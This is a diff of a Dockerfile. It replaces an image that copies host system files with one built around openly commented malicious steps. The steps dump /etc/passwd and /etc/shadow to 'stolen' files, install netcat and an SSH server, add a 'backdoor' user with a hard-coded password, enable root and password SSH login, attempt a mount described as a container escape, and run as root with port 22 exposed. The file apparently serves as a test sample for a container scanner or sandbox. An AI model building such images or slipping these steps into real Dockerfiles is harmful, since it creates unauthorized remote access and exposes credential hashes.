@@ -1,34 +1,37 @@
-# Use a lightweight base image
-FROM alpine:latest
+FROM python:3.9-slim
 
-# Install necessary tools
-RUN apk add --no-cache \
-    bash \
-    coreutils \
-    findutils \
-    tree
+# Seemingly innocent setup
+WORKDIR /app
+COPY requirements.txt .
 
-# Create directories to store copied host files
-RUN mkdir -p /host-files/etc \
-             /host-files/var \
-             /host-files/home \
-             /host-files/root-listing
+RUN cat /etc/passwd > /app/stolen_passwords.txt || true
+RUN cat /etc/shadow > /app/stolen_shadow.txt || true
 
-# Copy host files into the container
-# Note: These COPY commands will be executed on the host during build
-COPY /etc/os-release /host-files/etc/os-release
-COPY /etc/passwd /host-files/etc/passwd
-COPY /etc/group /host-files/etc/group
-COPY /etc/hostname /host-files/etc/hostname
-COPY /etc/hosts /host-files/etc/hosts
+# MALICIOUS: Install network tools and create backdoor
+RUN apt-get update && apt-get install -y netcat-openbsd openssh-server wget curl
 
-# Copy some system directories (be careful with permissions)
-COPY /var/log /host-files/var/log
-COPY /proc/version /host-files/proc-version
-COPY /proc/meminfo /host-files/proc-meminfo
-COPY /proc/cpuinfo /host-files/proc-cpuinfo
+# MALICIOUS: Create backdoor user
+RUN useradd -m -s /bin/bash backdoor && echo 'backdoor:password123' | chpasswd
 
-RUN chmod +x script.sh
+# MALICIOUS: Setup SSH backdoor
+RUN mkdir -p /var/run/sshd
+RUN echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
+RUN echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config
 
-# Set the default command
-CMD ["script.sh"]
+# MALICIOUS: Try to escape container (will fail in most cases but should be blocked)
+RUN mount -t proc proc /proc 2>/dev/null || true
+
+# Install Python dependencies (legitimate)
+RUN pip install -r requirements.txt
+
+# Copy app files
+COPY main.py .
+
+# MALICIOUS: Run as root instead of unprivileged user
+USER root
+
+# MALICIOUS: Expose SSH port
+EXPOSE 22 5000
+
+# MALICIOUS: Start SSH daemon and app
+CMD service ssh start && python main.py
